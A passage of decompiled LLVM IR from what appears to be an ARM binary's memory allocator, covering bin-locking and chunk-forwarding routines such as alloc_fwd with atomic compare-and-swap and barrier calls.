.thread18:                                        ; preds = %dec_label_pc_aef4
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_af0c

dec_label_pc_af00:                                ; preds = %dec_label_pc_aef4
  %v3_af04 = udiv i32 %v1_aee4, 2097152
  %v1_af08 = add nsw i32 %v3_af04, -496
  store i32 %v1_af08, i32* @r8, align 4
  br label %dec_label_pc_af0c

dec_label_pc_af0c:                                ; preds = %.thread18, %.thread, %dec_label_pc_af00
  %v0_af14 = phi i32 [ 63, %.thread18 ], [ %v1_aee4, %.thread ], [ %v1_af08, %dec_label_pc_af00 ]
  %v3_af10 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_af10, i32* %r2.global-to-local, align 4
  %v3_af14 = mul i32 %v0_af14, 16
  store i32 %v3_af14, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %sb.global-to-local, align 4
  %v2_af1c = icmp eq i32 %v3_af10, 0
  store i1 %v2_af1c, i1* @cpsr_z, align 1
  %v1_af20 = or i32 %v3_af14, 8
  store i32 %v1_af20, i32* %r3.global-to-local, align 4
  %v2_af24 = add i32 %v1_af20, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v2_af24, i32* @r6, align 4
  br i1 %v2_af1c, label %bb, label %dec_label_pc_afec

bb:                                               ; preds = %dec_label_pc_af0c
  store i32 %v1_af28, i32* @r0, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %bb, %dec_label_pc_b028
  %v0_af5438 = phi i32 [ %v1_af28, %bb ], [ %v2_b028, %dec_label_pc_b028 ]
  %v0_af34 = phi i32 [ ptrtoint (i32* @global_var_238f0.447 to i32), %bb ], [ %v0_af34.pre, %dec_label_pc_b028 ]
  %v0_af30 = phi i32 [ %v0_af14, %bb ], [ %v0_af30.pre, %dec_label_pc_b028 ]
  %v1_af30 = add i32 %v0_af30, 1
  store i32 %v1_af30, i32* @r1, align 4
  %v4_af34 = mul i32 %v1_af30, 16
  %v5_af34 = add i32 %v4_af34, %v0_af34
  %v6_af34 = inttoptr i32 %v5_af34 to i32*
  %v7_af34 = load i32, i32* %v6_af34, align 4
  store i32 %v7_af34, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r6.global-to-local, align 4
  %v2_af3c = icmp eq i32 %v7_af34, 0
  br i1 %v2_af3c, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_af30
  %v4_af40 = mul i32 %v1_af30, 16
  %v3_af44 = add i32 %v4_af40, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v3_af44, i32* %r3.global-to-local, align 4
  %v2_af48 = add i32 %v4_af40, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v2_af48, i32* %r2.global-to-local, align 4
  %v7_af4c = add i32 %v4_af34, ptrtoint (i32* @global_var_238f0.447 to i32)
  %v8_af4c = inttoptr i32 %v7_af4c to i32*
  store i32 %v2_af48, i32* %v8_af4c, align 4
  %v1_af50 = load i32, i32* %r2.global-to-local, align 4
  %v2_af50 = load i32, i32* %r3.global-to-local, align 4
  %v3_af50 = add i32 %v2_af50, 4
  %v4_af50 = inttoptr i32 %v3_af50 to i32*
  store i32 %v1_af50, i32* %v4_af50, align 4
  %v0_af54.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_af30, %bb31
  %v0_af54 = phi i32 [ %v0_af5438, %dec_label_pc_af30 ], [ %v0_af54.pre, %bb31 ]
  %v1_af54 = load i32, i32* @sl, align 4
  %v9_af54 = icmp eq i32 %v0_af54, %v1_af54
  br i1 %v9_af54, label %dec_label_pc_b030, label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %.thread4
  %v0_af5c = load i32, i32* @r5, align 4
  %v1_af5c = add i32 %v0_af5c, 8
  store i32 %v1_af5c, i32* @r2, align 4
  %v1_af60 = load i32, i32* %r6.global-to-local, align 4
  %v2_af60 = add i32 %v1_af60, %v1_af5c
  %v3_af60 = inttoptr i32 %v2_af60 to i32*
  %v4_af60 = load i32, i32* %v3_af60, align 4
  store i32 %v4_af60, i32* %r3.global-to-local, align 4
  %v2_af64 = icmp eq i32 %v4_af60, 0
  store i1 %v2_af64, i1* @cpsr_z, align 1
  store i32 %v2_af60, i32* @r4, align 4
  br i1 %v2_af64, label %dec_label_pc_afb0, label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af5c
  %v0_af70 = call i32 @__a_barrier()
  store i32 %v0_af70, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_af78 = load i32, i32* @r2, align 4
  %v2_af78 = load i32, i32* %r6.global-to-local, align 4
  %v3_af78 = add i32 %v2_af78, %v1_af78
  %v4_af78 = inttoptr i32 %v3_af78 to i32*
  store i32 0, i32* %v4_af78, align 4
  %v0_af7c = call i32 @__a_barrier()
  %v0_af80 = load i32, i32* @r5, align 4
  %v1_af80 = add i32 %v0_af80, 12
  store i32 %v1_af80, i32* %r3.global-to-local, align 4
  %v1_af84 = load i32, i32* %r6.global-to-local, align 4
  %v2_af84 = add i32 %v1_af84, %v1_af80
  %v3_af84 = inttoptr i32 %v2_af84 to i32*
  %v4_af84 = load i32, i32* %v3_af84, align 4
  store i32 %v4_af84, i32* %r2.global-to-local, align 4
  %v2_af88 = icmp eq i32 %v4_af84, 0
  br i1 %v2_af88, label %dec_label_pc_afac, label %dec_label_pc_af90

dec_label_pc_af90:                                ; preds = %dec_label_pc_af70
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_af94 = load i32, i32* @r4, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_afa4 = icmp eq i32 %v0_af94, -38
  br i1 %v7_afa4, label %dec_label_pc_b014, label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_af90, %dec_label_pc_af70
  %v0_afac = load i32, i32* %fp.global-to-local, align 4
  %v1_afac = inttoptr i32 %v0_afac to i32*
  %v2_afac = load i32, i32* %v1_afac, align 4
  br label %dec_label_pc_afb0

dec_label_pc_afb0:                                ; preds = %dec_label_pc_af5c, %dec_label_pc_b014, %dec_label_pc_afac
  %v0_afb0 = phi i32 [ %v0_af54, %dec_label_pc_af5c ], [ %v2_b020, %dec_label_pc_b014 ], [ %v2_afac, %dec_label_pc_afac ]
  store i32 %v0_afb0, i32* @sl, align 4
  %v1_afb4 = urem i32 %v0_afb0, 2
  %v2_afb4 = icmp eq i32 %v1_afb4, 0
  br i1 %v2_afb4, label %dec_label_pc_aee0, label %dec_label_pc_afbc

dec_label_pc_afbc:                                ; preds = %dec_label_pc_afb0, %entry
  br label %dec_label_pc_afc0

dec_label_pc_afc0:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b0c4, %dec_label_pc_afbc
  %v1_afc8 = phi i32 [ 1, %dec_label_pc_b0cc ], [ 1, %dec_label_pc_b0c4 ], [ 0, %dec_label_pc_afbc ]
  %v2_afc4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_afc4, i32* @r4, align 4
  store i32 %v6_aec8, i32* @r5, align 4
  store i32 %v9_aec8, i32* @r6, align 4
  store i32 %v12_aec8, i32* @r7, align 4
  store i32 %v15_aec8, i32* @r8, align 4
  store i32 %v21_aec8, i32* @sl, align 4
  ret i32 %v1_afc8

dec_label_pc_afd4:                                ; preds = %dec_label_pc_b010
  %v0_afd4 = load i32, i32* @r5, align 4
  %v1_afd4 = add i32 %v0_afd4, 12
  store i32 1, i32* @r2, align 4
  %v1_afdc = load i32, i32* %sb.global-to-local, align 4
  %v2_afdc = add i32 %v1_afd4, %v1_afdc
  %v0_afe0 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_afe8 = inttoptr i32 %v0_afe0 to i32*
  %v3_afe8 = call i32 @__wait(i32* %v2_afe8, i32 %v2_afdc)
  %v0_afec.pre = load i32, i32* @r5, align 4
  %v1_aff0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_afec

dec_label_pc_afec:                                ; preds = %dec_label_pc_af0c, %dec_label_pc_afd4
  %v1_aff0 = phi i32 [ %v1_aff0.pre, %dec_label_pc_afd4 ], [ ptrtoint (i32* @global_var_238f0.447 to i32), %dec_label_pc_af0c ]
  %v0_afec = phi i32 [ %v0_afec.pre, %dec_label_pc_afd4 ], [ %v3_af14, %dec_label_pc_af0c ]
  %v1_afec = add i32 %v0_afec, 8
  store i32 %v1_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v1_afec, %v1_aff0
  store i32 %v2_aff0, i32* @r7, align 4
  br label %dec_label_pc_aff4

dec_label_pc_aff4:                                ; preds = %dec_label_pc_aff4.dec_label_pc_aff4_crit_edge, %dec_label_pc_afec
  %v0_aff4 = phi i32 [ %v0_aff4.pre, %dec_label_pc_aff4.dec_label_pc_aff4_crit_edge ], [ %v2_aff0, %dec_label_pc_afec ]
  %v1_aff4 = inttoptr i32 %v0_aff4 to i32*
  %v2_aff4 = load i32, i32* %v1_aff4, align 4
  store i32 %v2_aff4, i32* @r4, align 4
  store i32 %v0_aff4, i32* @r2, align 4
  %v3_b004 = call i32 @__a_cas(i32 %v2_aff4, i32 1, i32 %v0_aff4)
  %v2_b008 = icmp eq i32 %v3_b004, 0
  store i1 %v2_b008, i1* @cpsr_z, align 1
  br i1 %v2_b008, label %dec_label_pc_b010, label %dec_label_pc_aff4.dec_label_pc_aff4_crit_edge

dec_label_pc_aff4.dec_label_pc_aff4_crit_edge:    ; preds = %dec_label_pc_aff4
  %v0_aff4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_aff4

dec_label_pc_b010:                                ; preds = %dec_label_pc_aff4
  %v0_afcc = load i32, i32* @r4, align 4
  %v2_afcc = icmp eq i32 %v0_afcc, 0
  br i1 %v2_afcc, label %dec_label_pc_b028, label %dec_label_pc_afd4

dec_label_pc_b014:                                ; preds = %dec_label_pc_af90
  %v0_b020 = load i32, i32* %fp.global-to-local, align 4
  %v1_b020 = inttoptr i32 %v0_b020 to i32*
  %v2_b020 = load i32, i32* %v1_b020, align 4
  br label %dec_label_pc_afb0

dec_label_pc_b028:                                ; preds = %dec_label_pc_b010
  %v0_b028 = load i32, i32* %fp.global-to-local, align 4
  %v1_b028 = inttoptr i32 %v0_b028 to i32*
  %v2_b028 = load i32, i32* %v1_b028, align 4
  store i32 %v2_b028, i32* @r0, align 4
  %v0_af30.pre = load i32, i32* @r8, align 4
  %v0_af34.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_b030:                                ; preds = %.thread4
  %v1_b030 = and i32 %v0_af54, -2
  store i32 %v1_b030, i32* %r3.global-to-local, align 4
  %v1_b034 = load i32, i32* %fp.global-to-local, align 4
  %v2_b034 = sub i32 %v1_b034, %v1_b030
  store i32 %v2_b034, i32* %r7.global-to-local, align 4
  %v1_b038 = add i32 %v2_b034, 8
  %v1_b03c = inttoptr i32 %v1_b038 to i32*
  %v2_b03c = load i32, i32* %v1_b03c, align 4
  store i32 %v2_b03c, i32* @r0, align 4
  %v3_b03c = add i32 %v2_b034, 12
  %v4_b03c = inttoptr i32 %v3_b03c to i32*
  %v5_b03c = load i32, i32* %v4_b03c, align 4
  store i32 %v5_b03c, i32* %ip.global-to-local, align 4
  %v9_b040 = icmp eq i32 %v5_b03c, %v2_b03c
  br i1 %v9_b040, label %dec_label_pc_b0e0, label %dec_label_pc_b048

dec_label_pc_b048:                                ; preds = %dec_label_pc_b030, %dec_label_pc_b140
  %v0_b054 = phi i32 [ %v2_b034, %dec_label_pc_b030 ], [ %v0_b140, %dec_label_pc_b140 ]
  %v1_b048 = add i32 %v0_b054, 4
  %v2_b048 = inttoptr i32 %v1_b048 to i32*
  %v3_b048 = load i32, i32* %v2_b048, align 4
  %v1_b04c = or i32 %v3_b048, 1
  store i32 %v1_b04c, i32* %r2.global-to-local, align 4
  %v1_b050 = and i32 %v3_b048, -2
  %v2_b054 = add i32 %v1_b050, %v0_b054
  %v3_b054 = inttoptr i32 %v2_b054 to i32*
  %v4_b054 = load i32, i32* %v3_b054, align 4
  %v1_b058 = or i32 %v4_b054, 1
  store i32 %v1_b058, i32* %r3.global-to-local, align 4
  store i32 %v1_b058, i32* %v3_b054, align 4
  %v0_b060 = load i32, i32* %r2.global-to-local, align 4
  %v1_b060 = load i32, i32* %r7.global-to-local, align 4
  %v2_b060 = add i32 %v1_b060, 4
  %v3_b060 = inttoptr i32 %v2_b060 to i32*
  store i32 %v0_b060, i32* %v3_b060, align 4
  %v0_b064 = load i32, i32* @r5, align 4
  %v1_b064 = add i32 %v0_b064, 8
  store i32 %v1_b064, i32* @r4, align 4
  %v0_b068 = load i32, i32* @r0, align 4
  %v1_b068 = load i32, i32* %ip.global-to-local, align 4
  %v2_b068 = add i32 %v1_b068, 8
  %v3_b068 = inttoptr i32 %v2_b068 to i32*
  store i32 %v0_b068, i32* %v3_b068, align 4
  %v0_b06c = load i32, i32* @r4, align 4
  %v1_b06c = load i32, i32* %sb.global-to-local, align 4
  %v2_b06c = add i32 %v1_b06c, %v0_b06c
  %v3_b06c = inttoptr i32 %v2_b06c to i32*
  %v4_b06c = load i32, i32* %v3_b06c, align 4
  store i32 %v4_b06c, i32* %r3.global-to-local, align 4
  %v0_b070 = load i32, i32* %r7.global-to-local, align 4
  %v1_b070 = add i32 %v0_b070, 8
  %v2_b070 = inttoptr i32 %v1_b070 to i32*
  %v3_b070 = load i32, i32* %v2_b070, align 4
  store i32 %v3_b070, i32* %r2.global-to-local, align 4
  %v2_b074 = icmp eq i32 %v4_b06c, 0
  store i1 %v2_b074, i1* @cpsr_z, align 1
  %v0_b078 = load i32, i32* %ip.global-to-local, align 4
  %v2_b078 = add i32 %v3_b070, 12
  %v3_b078 = inttoptr i32 %v2_b078 to i32*
  store i32 %v0_b078, i32* %v3_b078, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r1, align 4
  %v0_b080 = load i32, i32* @r4, align 4
  %v1_b080 = load i32, i32* %sb.global-to-local, align 4
  %v2_b080 = add i32 %v1_b080, %v0_b080
  store i32 %v2_b080, i32* %r6.global-to-local, align 4
  br i1 %v2_b074, label %dec_label_pc_b0c4, label %dec_label_pc_b088

dec_label_pc_b088:                                ; preds = %dec_label_pc_b048
  %v0_b088 = call i32 @__a_barrier()
  store i32 %v0_b088, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b090 = load i32, i32* @r4, align 4
  %v2_b090 = load i32, i32* @r1, align 4
  %v3_b090 = add i32 %v2_b090, %v1_b090
  %v4_b090 = inttoptr i32 %v3_b090 to i32*
  store i32 0, i32* %v4_b090, align 4
  %v0_b094 = call i32 @__a_barrier()
  %v0_b098 = load i32, i32* @r5, align 4
  %v1_b098 = add i32 %v0_b098, 12
  store i32 %v1_b098, i32* %r3.global-to-local, align 4
  %v1_b09c = load i32, i32* @r1, align 4
  %v2_b09c = add i32 %v1_b09c, %v1_b098
  %v3_b09c = inttoptr i32 %v2_b09c to i32*
  %v4_b09c = load i32, i32* %v3_b09c, align 4
  store i32 %v4_b09c, i32* %r2.global-to-local, align 4
  %v2_b0a0 = icmp eq i32 %v4_b09c, 0
  br i1 %v2_b0a0, label %dec_label_pc_b0c4, label %dec_label_pc_b0a8

dec_label_pc_b0a8:                                ; preds = %dec_label_pc_b088
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_b0ac = load i32, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_b0bc = icmp eq i32 %v0_b0ac, -38
  br i1 %v7_b0bc, label %dec_label_pc_b0cc, label %dec_label_pc_b0c4

dec_label_pc_b0c4:                                ; preds = %dec_label_pc_b0a8, %dec_label_pc_b088, %dec_label_pc_b048
  br label %dec_label_pc_afc0

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0a8
  br label %dec_label_pc_afc0

dec_label_pc_b0e0:                                ; preds = %dec_label_pc_b030
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_b0e4 = load i32, i32* @r8, align 4
  %v1_b0e4 = sub i32 32, %v0_b0e4
  %v7_b0ec = lshr i32 1, %v1_b0e4
  store i32 %v7_b0ec, i32* %r4.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0e4, -32
  %v6_b0f0 = icmp slt i32 %v1_b0f0, 0
  %v7_b0f0 = icmp eq i32 %v0_b0e4, 32
  store i1 %v7_b0f0, i1* @cpsr_z, align 1
  %v6_b0f4 = shl i32 1, %v0_b0e4
  store i32 %v6_b0f4, i32* %r3.global-to-local, align 4
  br i1 %v6_b0f0, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_b0e0
  %v7_b0f8 = shl i32 1, %v1_b0f0
  store i32 %v7_b0f8, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_b0e0, %bb32
  %v0_b100 = phi i32 [ %v7_b0ec, %dec_label_pc_b0e0 ], [ %v7_b0f8, %bb32 ]
  %v1_b0fc = sub i32 -1, %v6_b0f4
  %v1_b100 = sub i32 -1, %v0_b100
  store i32 %v1_b100, i32* %fp.global-to-local, align 4
  store i32 %v1_b0fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b108

dec_label_pc_b108:                                ; preds = %dec_label_pc_b108.dec_label_pc_b108_crit_edge, %bb33
  %v1_b110 = phi i32 [ %v1_b110.pre, %dec_label_pc_b108.dec_label_pc_b108_crit_edge ], [ %v1_b0fc, %bb33 ]
  %v2_b108 = load i32, i32* @global_var_238f0.447, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r2, align 4
  %v2_b110 = and i32 %v2_b108, %v1_b110
  %v3_b114 = call i32 @__a_cas(i32 %v2_b108, i32 %v2_b110, i32 ptrtoint (i32* @global_var_238f0.447 to i32))
  %v2_b118 = icmp eq i32 %v3_b114, 0
  store i1 %v2_b118, i1* @cpsr_z, align 1
  br i1 %v2_b118, label %dec_label_pc_b120, label %dec_label_pc_b108.dec_label_pc_b108_crit_edge

dec_label_pc_b108.dec_label_pc_b108_crit_edge:    ; preds = %dec_label_pc_b108
  %v1_b110.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b108

dec_label_pc_b120:                                ; preds = %dec_label_pc_b108
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* %r6.global-to-local, align 4
  %v0_b124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b124, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b128

dec_label_pc_b128:                                ; preds = %dec_label_pc_b128.dec_label_pc_b128_crit_edge, %dec_label_pc_b120
  %v1_b130 = phi i32 [ %v1_b130.pre, %dec_label_pc_b128.dec_label_pc_b128_crit_edge ], [ %v0_b124, %dec_label_pc_b120 ]
  %v2_b128 = load i32, i32* @global_var_238f4.449, align 4
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* @r2, align 4
  %v2_b130 = and i32 %v2_b128, %v1_b130
  %v3_b134 = call i32 @__a_cas(i32 %v2_b128, i32 %v2_b130, i32 ptrtoint (i32* @global_var_238f4.449 to i32))
  %v2_b138 = icmp eq i32 %v3_b134, 0
  store i1 %v2_b138, i1* @cpsr_z, align 1
  br i1 %v2_b138, label %dec_label_pc_b140, label %dec_label_pc_b128.dec_label_pc_b128_crit_edge

dec_label_pc_b128.dec_label_pc_b128_crit_edge:    ; preds = %dec_label_pc_b128
  %v1_b130.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b128

dec_label_pc_b140:                                ; preds = %dec_label_pc_b128
  %v0_b140 = load i32, i32* %r7.global-to-local, align 4
  %v1_b140 = add i32 %v0_b140, 8
  %v1_b144 = inttoptr i32 %v1_b140 to i32*
  %v2_b144 = load i32, i32* %v1_b144, align 4
  store i32 %v2_b144, i32* @r0, align 4
  %v3_b144 = add i32 %v0_b140, 12
  %v4_b144 = inttoptr i32 %v3_b144 to i32*
  %v5_b144 = load i32, i32* %v4_b144, align 4
  store i32 %v5_b144, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b048

; uselistorder directives
  uselistorder i32 %v0_b140, { 1, 2, 0 }
  uselistorder i32 %v2_b128, { 1, 0 }
  uselistorder i32 %v2_b108, { 1, 0 }
  uselistorder i32 %v1_b0fc, { 1, 0 }
  uselistorder i32 %v2_b028, { 1, 0 }
  uselistorder i32 %v0_aff4, { 1, 2, 0 }
  uselistorder i32 %v0_afb0, { 0, 2, 1 }
  uselistorder i32 %v0_af54, { 0, 2, 1 }
  uselistorder i32 %v4_af40, { 1, 0 }
  uselistorder i32 %v4_af34, { 1, 0 }
  uselistorder i32 %v3_af14, { 2, 1, 0 }
  uselistorder i32 %v0_af14, { 1, 0 }
  uselistorder i32 %v1_aee4, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v3_aee0, { 1, 0 }
  uselistorder i32 %v1_af28, { 1, 2, 0 }
  uselistorder i32 %v2_aecc, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_b048, { 1, 0 }
  uselistorder label %dec_label_pc_afec, { 1, 0 }
  uselistorder label %dec_label_pc_afb0, { 1, 2, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aee0, { 1, 0 }
}

define i32 @alloc_fwd(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_b158 = load i32, i32* @r4, align 4
  store i32 %v3_b158, i32* %stack_var_-36, align 4
  %v6_b158 = load i32, i32* @r5, align 4
  %v9_b158 = load i32, i32* @r6, align 4
  %v12_b158 = load i32, i32* @r7, align 4
  %v15_b158 = load i32, i32* @r8, align 4
  %v21_b158 = load i32, i32* @sl, align 4
  %v1_b15c = add i32 %arg1, 4
  %v2_b15c = inttoptr i32 %v1_b15c to i32*
  %v3_b15c = load i32, i32* %v2_b15c, align 4
  store i32 %v3_b15c, i32* @sl, align 4
  %v1_b160 = urem i32 %v3_b15c, 2
  %v2_b160 = icmp eq i32 %v1_b160, 0
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %v3_b15c, i32* %r7.global-to-local, align 4
  br i1 %v2_b160, label %dec_label_pc_b174, label %dec_label_pc_b254

dec_label_pc_b174:                                ; preds = %entry, %dec_label_pc_b248
  %v1_b1bc = phi i32 [ %v0_b248, %dec_label_pc_b248 ], [ %v3_b15c, %entry ]
  %v3_b174 = udiv i32 %v1_b1bc, 16
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = add nsw i32 %v3_b174, -1
  %tmp = icmp ult i32 %v1_b178, 33
  br i1 %tmp, label %.thread, label %dec_label_pc_b188

.thread:                                          ; preds = %dec_label_pc_b174
  store i32 %v1_b178, i32* @r8, align 4
  br label %dec_label_pc_b1a0

dec_label_pc_b188:                                ; preds = %dec_label_pc_b174
  %tmp37 = icmp ugt i32 %v1_b178, 7168
  br i1 %tmp37, label %.thread19, label %dec_label_pc_b194

.thread19:                                        ; preds = %dec_label_pc_b188
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_b1a0

dec_label_pc_b194:                                ; preds = %dec_label_pc_b188
  %v3_b198 = udiv i32 %v1_b178, 2097152
  %v1_b19c = add nsw i32 %v3_b198, -496
  store i32 %v1_b19c, i32* @r8, align 4
  br label %dec_label_pc_b1a0

dec_label_pc_b1a0:                                ; preds = %.thread19, %.thread, %dec_label_pc_b194
  %v0_b1a8 = phi i32 [ 63, %.thread19 ], [ %v1_b178, %.thread ], [ %v1_b19c, %dec_label_pc_b194 ]
  %v3_b1a4 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_b1a4, i32* %r2.global-to-local, align 4
  %v3_b1a8 = mul i32 %v0_b1a8, 16
  store i32 %v3_b1a8, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %sb.global-to-local, align 4
  %v2_b1b0 = icmp eq i32 %v3_b1a4, 0
  store i1 %v2_b1b0, i1* @cpsr_z, align 1
  %v1_b1b4 = or i32 %v3_b1a8, 8
  store i32 %v1_b1b4, i32* %r3.global-to-local, align 4
  %v2_b1b8 = add i32 %v1_b1b4, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v2_b1b8, i32* @r6, align 4
  br i1 %v2_b1b0, label %bb, label %dec_label_pc_b284

bb:                                               ; preds = %dec_label_pc_b1a0
  store i32 %v1_b1bc, i32* @r0, align 4
  br label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %bb, %dec_label_pc_b2ac
  %v0_b1e836 = phi i32 [ %v1_b1bc, %bb ], [ %v3_b2ac, %dec_label_pc_b2ac ]
  %v0_b1c8 = phi i32 [ ptrtoint (i32* @global_var_238f0.447 to i32), %bb ], [ %v0_b1c8.pre, %dec_label_pc_b2ac ]
  %v0_b1c4 = phi i32 [ %v0_b1a8, %bb ], [ %v0_b1c4.pre, %dec_label_pc_b2ac ]
  %v1_b1c4 = add i32 %v0_b1c4, 1
  store i32 %v1_b1c4, i32* @r1, align 4
  %v4_b1c8 = mul i32 %v1_b1c4, 16
  %v5_b1c8 = add i32 %v4_b1c8, %v0_b1c8
  %v6_b1c8 = inttoptr i32 %v5_b1c8 to i32*
  %v7_b1c8 = load i32, i32* %v6_b1c8, align 4
  store i32 %v7_b1c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* %r6.global-to-local, align 4
  %v2_b1d0 = icmp eq i32 %v7_b1c8, 0
  br i1 %v2_b1d0, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_b1c4
  %v4_b1d4 = mul i32 %v1_b1c4, 16
  %v3_b1d8 = add i32 %v4_b1d4, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v3_b1d8, i32* %r3.global-to-local, align 4
  %v2_b1dc = add i32 %v4_b1d4, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v2_b1dc, i32* %r2.global-to-local, align 4
  %v7_b1e0 = add i32 %v4_b1c8, ptrtoint (i32* @global_var_238f0.447 to i32)
  %v8_b1e0 = inttoptr i32 %v7_b1e0 to i32*
  store i32 %v2_b1dc, i32* %v8_b1e0, align 4
  %v1_b1e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b1e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_b1e4 = add i32 %v2_b1e4, 4
  %v4_b1e4 = inttoptr i32 %v3_b1e4 to i32*
  store i32 %v1_b1e4, i32* %v4_b1e4, align 4
  %v0_b1e8.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_b1c4, %bb31
  %v0_b1e8 = phi i32 [ %v0_b1e836, %dec_label_pc_b1c4 ], [ %v0_b1e8.pre, %bb31 ]
  %v1_b1e8 = load i32, i32* @sl, align 4
  %v9_b1e8 = icmp eq i32 %v0_b1e8, %v1_b1e8
  br i1 %v9_b1e8, label %dec_label_pc_b2c8, label %dec_label_pc_b1f0

dec_label_pc_b1f0:                                ; preds = %.thread4
  %v0_b1f0 = load i32, i32* @r5, align 4
  %v1_b1f0 = add i32 %v0_b1f0, 8
  store i32 %v1_b1f0, i32* @r2, align 4
  %v1_b1f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_b1f4 = add i32 %v1_b1f4, %v1_b1f0
  %v3_b1f4 = inttoptr i32 %v2_b1f4 to i32*
  %v4_b1f4 = load i32, i32* %v3_b1f4, align 4
  store i32 %v4_b1f4, i32* %r3.global-to-local, align 4
  %v2_b1f8 = icmp eq i32 %v4_b1f4, 0
  store i1 %v2_b1f8, i1* @cpsr_z, align 1
  store i32 %v2_b1f4, i32* @r4, align 4
  br i1 %v2_b1f8, label %dec_label_pc_b248, label %dec_label_pc_b204

dec_label_pc_b204:                                ; preds = %dec_label_pc_b1f0
  %v0_b204 = call i32 @__a_barrier()
  store i32 %v0_b204, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b20c = load i32, i32* @r2, align 4
  %v2_b20c = load i32, i32* %r6.global-to-local, align 4
  %v3_b20c = add i32 %v2_b20c, %v1_b20c
  %v4_b20c = inttoptr i32 %v3_b20c to i32*
  store i32 0, i32* %v4_b20c, align 4
  %v0_b210 = call i32 @__a_barrier()
  %v0_b214 = load i32, i32* @r5, align 4
  %v1_b214 = add i32 %v0_b214, 12
  store i32 %v1_b214, i32* %r3.global-to-local, align 4
  %v1_b218 = load i32, i32* %r6.global-to-local, align 4
  %v2_b218 = add i32 %v1_b218, %v1_b214
  %v3_b218 = inttoptr i32 %v2_b218 to i32*
  %v4_b218 = load i32, i32* %v3_b218, align 4
  store i32 %v4_b218, i32* %r2.global-to-local, align 4
  %v2_b21c = icmp eq i32 %v4_b218, 0
  br i1 %v2_b21c, label %dec_label_pc_b240, label %dec_label_pc_b224

